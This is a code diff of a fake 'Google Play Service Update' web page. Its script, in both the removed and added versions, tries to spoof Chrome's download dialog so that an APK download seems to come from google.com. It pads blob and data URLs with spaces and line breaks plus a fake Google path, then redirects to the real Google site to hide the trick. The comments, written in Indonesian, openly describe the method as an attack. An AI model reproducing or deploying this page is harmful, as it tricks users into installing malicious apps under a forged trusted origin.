@@ -3,101 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Play Service Update</title>
-    <style>
-        body { 
-            background-color: #f8f9fa; 
-            margin: 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            font-family: 'Roboto', sans-serif;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 350px;
-        }
-        .g-logo {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .blue { color: #4285F4; } .red { color: #EA4335; } 
-        .yellow { color: #FBBC05; } .green { color: #34A853; }
-        
-        h2 { font-size: 18px; color: #202124; margin-bottom: 10px; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.5; }
-        
-        #pwnBtn {
-            margin-top: 25px;
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            font-weight: 500;
-            cursor: pointer;
-            width: 100%;
-        }
-    </style>
+    <title>Google Security</title>
 </head>
-<body>
-
-<div class="container">
-    <div class="g-logo">
-        <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
-    </div>
-    <h2>System Update Required</h2>
-    <p>Install the latest security patches for Google Play Services to keep your device secure.</p>
-    
-    <button id="pwnBtn">UPDATE NOW</button>
-</div>
+<body style="background:#f1f3f4; text-align:center; padding-top:50px;">
+    <h2>Google Play Service Update</h2>
+    <button id="pwnBtn" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">UPDATE NOW</button>
 
 <script>
     document.getElementById('pwnBtn').addEventListener('click', function() {
-        const filename = "Google_Play_v2026.apk";
-        const targetDomain = "https://www.google.com";
+        const spoofDomain = "www.google.com";
         
-        // --- CHROME ADVANCED ATTACK LOGIC ---
+        // 1. Buat konten file palsu
+        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]);
+        const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
         
-        // 1. Long MIME Type untuk membingungkan parser UI awal
-        const longMime = "application/octet-stream" + ";".repeat(100);
+        // 2. Gunakan URL.createObjectURL
+        const blobUrl = URL.createObjectURL(blob);
         
-        // 2. Line Break & Carriage Return (%0D%0A)
-        // Mencoba memaksa teks setelah fragment pindah ke baris baru di dialog Chrome
-        const lineBreak = decodeURIComponent("%0D%0A");
+        // 3. Gunakan karakter spesial untuk menyamarkan 'blob:https://'
+        // Kita gunakan %00 (Null Byte) atau %0A (Newline) jika didukung
+        const padding = " ".repeat(500); 
+        const fakeOrigin = "https://" + spoofDomain + "/update-verification-system-v2026/";
         
-        // 3. Massive Padding menggunakan Non-Breaking Space
-        const nbSpace = decodeURIComponent("%C2%A0");
-        const massivePadding = nbSpace.repeat(2500); 
+        // 4. TEKNIK INTI: Navigasi Langsung
+        // Alih-alih 'download', kita arahkan window ke blob tersebut.
+        // Chrome akan melihat ini sebagai navigasi ke file, lalu memicu dialog download.
+        const finalUrl = blobUrl + "#" + fakeOrigin;
 
-        // Konstruksi Payload
-        // data:[MIME]#[Padding][LineBreak][FakeOrigin]
-        const base64Payload = "ZXN0dGVzdHRlc3Q="; 
-        const payload = `data:${longMime};base64,${base64Payload}#${massivePadding}${lineBreak}${targetDomain}/update/patch/`;
+        // Buka di jendela baru atau tab ini
+        window.location.href = finalUrl;
 
-        // Create hidden anchor
-        const a = document.createElement('a');
-        a.href = payload;
-        a.download = filename;
-        document.body.appendChild(a);
-        
-        // Trigger Download
-        a.click();
-
-        // Immediate Redirect ke Google Asli
-        // Ini mengubah context "Active Tab" di Address Bar saat dialog muncul
+        // Redirect ke google asli setelah jeda untuk menutupi jejak di address bar
         setTimeout(() => {
-            window.location.href = "https://www.google.com/";
-            document.body.removeChild(a);
-        }, 3000);
+            window.location.replace("https://www.google.com");
+        }, 800);
     });
 </script>
-
 </body>
 </html>
